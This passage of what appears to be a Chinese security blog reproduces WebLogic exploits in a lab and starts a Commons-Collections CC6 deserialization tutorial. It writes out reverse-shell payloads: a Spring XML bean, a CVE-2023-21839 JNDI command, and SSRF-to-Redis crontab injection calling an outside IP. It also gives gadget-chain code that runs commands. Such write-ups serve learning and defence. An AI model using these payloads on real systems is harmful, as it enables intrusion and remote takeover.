class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&lt;![CDATA[/bin/bash -i &gt;&amp; /dev/tcp/vps/5555 0&gt;&amp;1]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>实测反弹shell成功！</p><p><img src="/../../../blog_image/image-20240507161222940.png" alt="image-20240507161222940"></p><p>写入冰蝎马，这里先留个坑，由于不知道写入路径，是很难写入webshell的。</p><h2 id="6-4-修复修复："><a href="#6-4-修复修复：" class="headerlink" title="6.4 修复修复："></a>6.4 修复修复：</h2><p>升级最新版本，或者对传入的url进行严格的校验。</p><h1 id="7-Weblogic未授权远程代码执行漏洞-CVE-2023-21839-："><a href="#7-Weblogic未授权远程代码执行漏洞-CVE-2023-21839-：" class="headerlink" title="7. Weblogic未授权远程代码执行漏洞 (CVE-2023-21839)："></a>7. Weblogic未授权远程代码执行漏洞 (CVE-2023-21839)：</h1><h2 id="7-1-漏洞简述："><a href="#7-1-漏洞简述：" class="headerlink" title="7.1 漏洞简述："></a>7.1 漏洞简述：</h2><p>CVE-2023-21839 允许远程用户在未经授权的情况下通过 IIOP&#x2F;T3 进行 JNDI lookup 操作，当 JDK 版本过低或本地存在小工具（javaSerializedData）时，这可能会导致 RCE 漏洞</p><p>影响版本：</p><blockquote><p>12.2.1.2.0<br>12.2.1.1.0<br>12.2.1.3.0<br>12.2.1.0.0<br>12.2.1.4.0<br>14.1.1.0.0<br>12.1.2.0.0<br>12.1.3.0.0<br>10.3.6.0</p></blockquote><h2 id="7-2-漏洞原理："><a href="#7-2-漏洞原理：" class="headerlink" title="7.2 漏洞原理："></a>7.2 漏洞原理：</h2><p>使用通过t3协议进行jndi注入，在低版本jdk中可能存在jndi注入的可能，从而导致rce。</p><h2 id="7-3-漏洞复现-："><a href="#7-3-漏洞复现-：" class="headerlink" title="7.3 漏洞复现 ："></a>7.3 漏洞复现 ：</h2><p>下载工具：</p><p><a href="https://github.com/DXask88MA/Weblogic-CVE-2023-21839/tree/main">DXask88MA&#x2F;Weblogic-CVE-2023-21839 (github.com)</a></p><p>使用jndiExploit工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i vps的ip<br></code></pre></td></tr></table></figure><p><img src="/../../../blog_image/image-20240507164429199.png" alt="image-20240507164429199"></p><p><img src="/../../../blog_image/image-20240507164346936.png" alt="image-20240507164346936"></p><p>poc工具使用如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar Weblogic-CVE-2023-21839.jar 靶场 IP:7001 ldap://ldap服务器IP:1389/Basic/ReverseShell/ldap服务器IP/nc监听端口<br></code></pre></td></tr></table></figure><p><img src="/../../../blog_image/image-20240507164702640.png" alt="image-20240507164702640"></p><p>成功反弹shell：</p><p><img src="/../../../blog_image/image-20240507164605610.png" alt="image-20240507164605610"></p><h2 id="7-4-修复建议："><a href="#7-4-修复建议：" class="headerlink" title="7.4 修复建议："></a>7.4 修复建议：</h2><ol><li>升级最先版本</li><li>升级java版本</li></ol><h1 id="8-SSRF"><a href="#8-SSRF" class="headerlink" title="8. SSRF:"></a>8. SSRF:</h1><h2 id="漏洞简述："><a href="#漏洞简述：" class="headerlink" title="漏洞简述："></a>漏洞简述：</h2><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p><h2 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h2><p>使用ssrf发送任意http请求，从而攻击内网服务器。</p><h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>访问：<code>http://your-ip:7001/uddiexplorer/</code>，无需登录即可查看uddiexplorer应用。</p><p><img src="/../../../blog_image/image-20240507165249467.png" alt="image-20240507165249467"></p><h3 id="ssrf测试："><a href="#ssrf测试：" class="headerlink" title="ssrf测试："></a>ssrf测试：</h3><p>可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回<code>did not have a valid SOAP content-type</code>。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.42.128:7001<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br></code></pre></td></tr></table></figure><p>访问一个不存在端口：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7002</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.42.128:7001<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><br></code></pre></td></tr></table></figure><p>修改为一个不存在的端口，将会返回<code>could not connect over HTTP to server</code>。</p><p><img src="/../../../blog_image/image-20240507165807167.png" alt="image-20240507165807167"></p><p>通过错误的不同，即可探测内网状态。</p><h3 id="注入HTTP头，利用Redis反弹shell："><a href="#注入HTTP头，利用Redis反弹shell：" class="headerlink" title="注入HTTP头，利用Redis反弹shell："></a>注入HTTP头，利用Redis反弹shell：</h3><p>判断内网是否存在redis：</p><p>如果会先如下则表明内网中存在一个redis服务:<code>http://172.23.0.2:6379 which did not have a valid SOAP content-type: null.</code></p><p><img src="/../../../blog_image/image-20240509111441833.png" alt="image-20240509111441833"></p><p>在centos中，可以写入在crontab写入定时任务反弹shell，前提是redis是未授权可以访问的。</p><p>反弹shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-built_in">set</span> 1 <span class="hljs-string">&quot;\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/121.37.229.215/5555 0&gt;&amp;1&#x27;\n\n\n\n&quot;</span><br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /etc/<br>config <span class="hljs-built_in">set</span> dbfilename crontab<br>save<br></code></pre></td></tr></table></figure><p>url编码后，完整的http请求包如下：</p><p>注意这里是test后面跟的是<code>\r\n</code>，url编码后的结果是<code>%0D%0A%0D%0A</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.23.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F121.37.229.215%2F5555%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>121.37.229.215:7001<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><br></code></pre></td></tr></table></figure><p>修改如下：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>Aset<span class="hljs-variable">%201</span><span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>Cn<span class="hljs-variable">%5</span>Cn<span class="hljs-variable">%5</span>Cn<span class="hljs-variable">%5</span>Cn<span class="hljs-number">0</span><span class="hljs-number">-59</span><span class="hljs-variable">%200</span><span class="hljs-number">-23</span><span class="hljs-variable">%201</span><span class="hljs-number">-31</span><span class="hljs-variable">%201</span><span class="hljs-number">-12</span><span class="hljs-variable">%200</span><span class="hljs-number">-6</span><span class="hljs-variable">%20</span>root<span class="hljs-variable">%20</span>bash<span class="hljs-variable">%20</span>-<span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%27</span>[url编码的内容]<span class="hljs-number">27</span><span class="hljs-variable">%5</span>Cn<span class="hljs-variable">%5</span>Cn<span class="hljs-variable">%5</span>Cn<span class="hljs-variable">%5</span>Cn<span class="hljs-variable">%22</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>Aconfig<span class="hljs-variable">%20</span>set<span class="hljs-variable">%20</span>dir<span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>Fetc<span class="hljs-variable">%2</span>F<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>Aconfig<span class="hljs-variable">%20</span>set<span class="hljs-variable">%20</span>dbfilename<span class="hljs-variable">%20</span>crontab<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>Asave<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>Aaaa<br></code></pre></td></tr></table></figure><p><img src="/../../../blog_image/image-20240509130416373.png" alt="image-20240509130416373"></p><p>成功反弹shell：</p><p><img src="/../../../blog_image/image-20240509125332183.png" alt="image-20240509125332183"></p><h3 id="踩坑："><a href="#踩坑：" class="headerlink" title="踩坑："></a>踩坑：</h3><p>还想用gopher去打redis，结果说不知道这个协议好吧。</p><p><img src="/../../../blog_image/image-20240509135429340.png" alt="image-20240509135429340"></p><p>但是也学习到如何使用gopherus这个工具，下载目录在<a href="https://github.com/tarunkant/Gopherus">tarunkant&#x2F;Gopherus: This tool generates gopher link for exploiting SSRF and gaining RCE in various servers (github.com)</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 gopherus.py --exploit redis<br></code></pre></td></tr></table></figure><p><img src="/../../../blog_image/image-20240509135537493.png" alt="image-20240509135537493"></p><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><h2 id="1-weblogic主要有两种反序列化？"><a href="#1-weblogic主要有两种反序列化？" class="headerlink" title="1. weblogic主要有两种反序列化？"></a>1. weblogic主要有两种反序列化？</h2><p>分别是xml反序列化和t3协议反序列化。</p><h2 id="2-什么是t3协议反序列化？"><a href="#2-什么是t3协议反序列化？" class="headerlink" title="2. 什么是t3协议反序列化？"></a>2. 什么是t3协议反序列化？</h2><p>RMI通信传输反序列化数据，接收数据后进行反序列化，正常RMI通信使用的是JRMP协议，而在Weblogic的RMI通信中使用的是T3协议。</p><h2 id="3-weblogic有哪些漏洞："><a href="#3-weblogic有哪些漏洞：" class="headerlink" title="3.weblogic有哪些漏洞："></a>3.weblogic有哪些漏洞：</h2><p>xml反序列化，后台弱口令getshell，未授权访问，ssrf</p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://mp.weixin.qq.com/s/7m7n_qvpP3YEF5Z37WAZnQ">https://mp.weixin.qq.com/s/7m7n_qvpP3YEF5Z37WAZnQ</a></p><p><a href="https://mp.weixin.qq.com/s/pdKgG4sbR3JIWn-4PzDl-A">https://mp.weixin.qq.com/s/pdKgG4sbR3JIWn-4PzDl-A</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>中间件</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>weblogic</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xxl-job漏洞复现与利用</title>
    <link href="/2024/05/31/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/xxl-job/xxl-job%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <url>/2024/05/31/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/xxl-job/xxl-job%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>cc6调用链</title>
    <link href="/2024/05/28/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/cc%E9%93%BE/cc6%E8%B0%83%E7%94%A8%E9%93%BE/"/>
    <url>/2024/05/28/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/cc%E9%93%BE/cc6%E8%B0%83%E7%94%A8%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-写在前面："><a href="#0x01-写在前面：" class="headerlink" title="0x01 写在前面："></a>0x01 写在前面：</h1><p>cc6和cc1的不同之处，其中cc6对于jdk版本不敏感，即任意jdk版本都可以调用。（cc1需要<code>jdk1.8.65</code>，以及<code>Commons-Collections 3.2.1</code>）</p><p>cc6的前半段和cc1的lazyMap调用链是一样的。</p><p>cc6可以说是</p><blockquote><p>cc6 &#x3D; cc1 + URLDNS</p></blockquote><p>cc6可以非常常用，因为它主要是依赖于hashCode，map的get方法等基础库就存在的api。而且不受限于java版本。</p><h1 id="0x02-环境配置："><a href="#0x02-环境配置：" class="headerlink" title="0x02 环境配置："></a>0x02 环境配置：</h1><ul><li><p>jdk安装：<a href="https://download.oracle.com/otn/java/jdk/8u71-b15/jdk-8u71-windows-x64.exe?AuthParam=1703819687_2c92f8e1f077851d7ca33b33e6e07dfa">jdk_1.8.71</a></p></li><li><p>导入maven坐标：</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="0x03-构造调用链："><a href="#0x03-构造调用链：" class="headerlink" title="0x03 构造调用链："></a>0x03 构造调用链：</h1><p><code>TiedMapEntry</code>构造函数，可以传入一个map以及一个key，因此可以传入<code>lazymap</code>，返回的<code>TiedMapEntry</code>的<code>getValue</code>函数调用的是<code>layzMap</code>的<code>get</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// InvokerTransformer 传入形参会通过反射进行调用</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>        &#125;;<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br>        <span class="hljs-comment">// TiedMapEntry 构造函数 一个map以及一个key 因此可以传入lazyMap</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;foo&quot;</span>);<br>        entry.getValue();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>简化可以写成：</p><p><code>LazyMap</code>的get方法会调用<code>factory</code>的<code>transform</code>方法。</p><p>根据上面编写的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>factory.transform(runtime);<br></code></pre></td></tr></table></figure><p>我们就可以尝试把<code>factory</code>设置成<code>InvokerTransformer</code>这个类，<code>key</code>设置成<code>Runtime</code>这个类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>    <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>    factory.transform(runtime);<br>    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    <span class="hljs-comment">// 传入InvokerTransformer LazyMap的get方法中调用的factory就是我们传入的传入InvokerTransformer了</span><br>    <span class="hljs-comment">// 然后get方法会调用transform 就是相当于调用了传入InvokerTransformer.transform</span><br>    <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, factory);<br>    lazyMap.get(runtime);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>LazyMap</code>的get方法如图所示：</p><p><img src="/../../../blog_image/image-20240327095152628-1716862542443-267.png" alt="image-20240327095152628"></p><p>查询到<code>TiedMapEntry</code>类中的<code>getValue()</code>方法，调用的是一个map的<code>get</code>方法，因此我们可以将map设置为<code>LazyMap</code></p><p><img src="/../../../blog_image/image-20240327114432200-1716862542443-269.png" alt="image-20240327114432200"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">// 创建一个runtime示例 ==》 调用Runtime.getRuntime()</span><br>    Transformer[] transformers = &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>    &#125;;<br><br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, factory);<br>    <br>    <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);<br>    tiedMapEntry.getValue();<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有个奇怪的点，就是走到<code>TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;key&quot;);</code>已经弹出计算器了，为什么呢？这里是idea的一个小坑。</p><p>寻找的方法也略提一嘴，因为 <code>getValue()</code> 这一个方法是相当相当常见的，所以我们一般会优先找同一类下是否存在调用情况。</p><p>再网上找谁调用了<code>getVaule()</code>方法：</p><p>可以看到<code>hashCode()</code>方法调用了<code>getVaule()</code>方法。</p><p><img src="/../../../blog_image/image-20240327114542867-1716862542443-270.png" alt="image-20240327114542867"></p><p>再看谁调用了<code>hashCode</code>方法，不用说，再java反序列化中基本上都有这一条链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">xxx.readObject()<br>HashMap.put() --自动调用--&gt;   